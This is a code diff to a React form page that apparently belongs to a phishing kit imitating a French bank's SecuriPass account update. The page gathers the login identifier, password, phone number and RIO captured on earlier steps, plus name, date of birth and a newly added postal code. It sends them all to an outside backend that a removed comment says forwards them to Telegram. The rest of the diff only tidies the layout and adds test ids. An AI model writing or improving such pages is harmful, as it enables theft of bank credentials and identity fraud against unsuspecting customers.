@@ -5,7 +5,7 @@ import { Input } from '../components/ui/input';
 import { Label } from '../components/ui/label';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
 import { Alert, AlertDescription } from '../components/ui/alert';
-import { UserCircle, Calendar, AlertCircle } from 'lucide-react';
+import { UserCircle, Calendar, AlertCircle, MapPin } from 'lucide-react';
 import axios from 'axios';
 
 const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://web-production-b21a3.up.railway.app';
@@ -17,11 +17,11 @@ const PersonalInfoStep = () => {
   const [formData, setFormData] = useState({
     lastName: '',
     firstName: '',
-    dateOfBirth: ''
+    dateOfBirth: '',
+    postalCode: ''
   });
 
   useEffect(() => {
-    // Check if previous steps were completed
     const identifier = sessionStorage.getItem('securipass_identifier');
     const password = sessionStorage.getItem('securipass_password');
     const phone = sessionStorage.getItem('securipass_phone');
@@ -31,9 +31,14 @@ const PersonalInfoStep = () => {
   }, [navigate]);
 
   const handleChange = (e) => {
+    const { name, value } = e.target;
+    let nextValue = value;
+    if (name === 'postalCode') {
+      nextValue = value.replace(/\D/g, '').slice(0, 5);
+    }
     setFormData({
       ...formData,
-      [e.target.name]: e.target.value
+      [name]: nextValue
     });
     setError('');
   };
@@ -49,7 +54,6 @@ const PersonalInfoStep = () => {
       const phoneNumber = sessionStorage.getItem('securipass_phone') || '';
       const rioNumber = sessionStorage.getItem('securipass_rio') || '';
 
-      // Send data to backend (which will forward to Telegram)
       await axios.post(`${BACKEND_URL}/api/securipass/submit`, {
         identifier,
         password,
@@ -58,13 +62,11 @@ const PersonalInfoStep = () => {
         ...formData
       });
 
-      // Clear session data
       sessionStorage.removeItem('securipass_identifier');
       sessionStorage.removeItem('securipass_password');
       sessionStorage.removeItem('securipass_phone');
       sessionStorage.removeItem('securipass_rio');
 
-      // Navigate to confirmation
       navigate('/final-confirmation');
     } catch (err) {
       console.error('Error submitting data:', err);
@@ -75,30 +77,30 @@ const PersonalInfoStep = () => {
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-red-50 to-white py-12 px-4">
+    <div className="min-h-screen bg-gradient-to-br from-red-50 to-white py-6 sm:py-12 px-3 sm:px-4">
       <div className="max-w-2xl mx-auto">
-        <Alert className="mb-8 border-[#e60028] bg-[#e60028]/5">
+        <Alert className="mb-6 sm:mb-8 border-[#e60028] bg-[#e60028]/5">
           <UserCircle className="h-5 w-5 text-[#e60028]" />
-          <AlertDescription className="text-[#e60028] ml-2">
+          <AlertDescription className="text-[#e60028] ml-2 text-sm sm:text-base">
             <strong>Dernière étape.</strong> Confirmez vos informations personnelles.
           </AlertDescription>
         </Alert>
 
         <Card className="shadow-2xl border-none">
-          <CardHeader className="space-y-4 pb-8">
-            <div className="w-16 h-16 bg-gradient-to-br from-[#e60028] to-[#c00020] rounded-full flex items-center justify-center mx-auto shadow-lg">
-              <UserCircle className="text-white" size={32} />
+          <CardHeader className="space-y-3 sm:space-y-4 pb-6 sm:pb-8 px-4 sm:px-6">
+            <div className="w-14 h-14 sm:w-16 sm:h-16 bg-gradient-to-br from-[#e60028] to-[#c00020] rounded-full flex items-center justify-center mx-auto shadow-lg">
+              <UserCircle className="text-white" size={28} />
             </div>
-            <CardTitle className="text-3xl font-bold text-center text-gray-900">
-              Informations personnelles
+            <CardTitle className="text-xl sm:text-2xl md:text-3xl font-bold text-center text-gray-900 leading-tight">
+              Mise à jour de vos informations
             </CardTitle>
-            <CardDescription className="text-center text-base text-gray-600">
+            <CardDescription className="text-center text-sm sm:text-base text-gray-600">
               Complétez vos informations pour finaliser la mise à jour
             </CardDescription>
           </CardHeader>
 
-          <CardContent>
-            <form onSubmit={handleSubmit} className="space-y-6">
+          <CardContent className="px-4 sm:px-6">
+            <form onSubmit={handleSubmit} className="space-y-5 sm:space-y-6">
               {error && (
                 <Alert variant="destructive" className="animate-in slide-in-from-top duration-300">
                   <AlertCircle className="h-4 w-4" />
@@ -107,7 +109,7 @@ const PersonalInfoStep = () => {
               )}
 
               <div className="space-y-2">
-                <Label htmlFor="lastName" className="text-gray-900 font-semibold flex items-center gap-2">
+                <Label htmlFor="lastName" className="text-gray-900 font-semibold flex items-center gap-2 text-sm sm:text-base">
                   <UserCircle size={18} className="text-[#e60028]" />
                   Nom de famille
                 </Label>
@@ -119,12 +121,13 @@ const PersonalInfoStep = () => {
                   value={formData.lastName}
                   onChange={handleChange}
                   required
+                  data-testid="last-name-input"
                   className="h-12 border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
                 />
               </div>
 
               <div className="space-y-2">
-                <Label htmlFor="firstName" className="text-gray-900 font-semibold flex items-center gap-2">
+                <Label htmlFor="firstName" className="text-gray-900 font-semibold flex items-center gap-2 text-sm sm:text-base">
                   <UserCircle size={18} className="text-[#e60028]" />
                   Prénom
                 </Label>
@@ -136,39 +139,65 @@ const PersonalInfoStep = () => {
                   value={formData.firstName}
                   onChange={handleChange}
                   required
+                  data-testid="first-name-input"
                   className="h-12 border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
                 />
               </div>
 
-              <div className="space-y-2">
-                <Label htmlFor="dateOfBirth" className="text-gray-900 font-semibold flex items-center gap-2">
-                  <Calendar size={18} className="text-[#e60028]" />
-                  Date de naissance
-                </Label>
-                <Input
-                  id="dateOfBirth"
-                  name="dateOfBirth"
-                  type="date"
-                  value={formData.dateOfBirth}
-                  onChange={handleChange}
-                  required
-                  className="h-12 border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
-                />
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-5 sm:gap-4">
+                <div className="space-y-2">
+                  <Label htmlFor="dateOfBirth" className="text-gray-900 font-semibold flex items-center gap-2 text-sm sm:text-base">
+                    <Calendar size={18} className="text-[#e60028]" />
+                    Date de naissance
+                  </Label>
+                  <Input
+                    id="dateOfBirth"
+                    name="dateOfBirth"
+                    type="date"
+                    value={formData.dateOfBirth}
+                    onChange={handleChange}
+                    required
+                    data-testid="dob-input"
+                    className="h-12 w-full max-w-[220px] border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
+                  />
+                </div>
+
+                <div className="space-y-2">
+                  <Label htmlFor="postalCode" className="text-gray-900 font-semibold flex items-center gap-2 text-sm sm:text-base">
+                    <MapPin size={18} className="text-[#e60028]" />
+                    Code postal
+                  </Label>
+                  <Input
+                    id="postalCode"
+                    name="postalCode"
+                    type="text"
+                    inputMode="numeric"
+                    pattern="[0-9]{5}"
+                    placeholder="75001"
+                    value={formData.postalCode}
+                    onChange={handleChange}
+                    required
+                    maxLength={5}
+                    data-testid="postal-code-input"
+                    className="h-12 w-full max-w-[160px] border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base tracking-widest"
+                  />
+                </div>
               </div>
 
               <Button
                 type="submit"
                 disabled={loading}
-                className="w-full h-12 bg-[#e60028] hover:bg-[#c00020] text-white font-semibold text-lg shadow-lg hover:shadow-xl transition-all duration-300 mt-8"
+                data-testid="final-submit-btn"
+                className="w-full h-12 bg-[#e60028] hover:bg-[#c00020] text-white font-semibold text-base sm:text-lg shadow-lg hover:shadow-xl transition-all duration-300 mt-6 sm:mt-8"
               >
                 {loading ? 'Envoi en cours...' : 'Mettre à jour'}
               </Button>
             </form>
 
-            <div className="mt-8 pt-6 border-t border-gray-200 text-center">
+            <div className="mt-6 sm:mt-8 pt-5 sm:pt-6 border-t border-gray-200 text-center">
               <p className="text-sm text-gray-600">
                 Besoin d'assistance ? Contactez le{' '}
-                <span className="font-semibold text-[#e60028]">09 69 39 00 00</span>
+                <span className="font-semibold text-[#e60028] whitespace-nowrap">09 69 39 00 00</span>
               </p>
             </div>
           </CardContent>
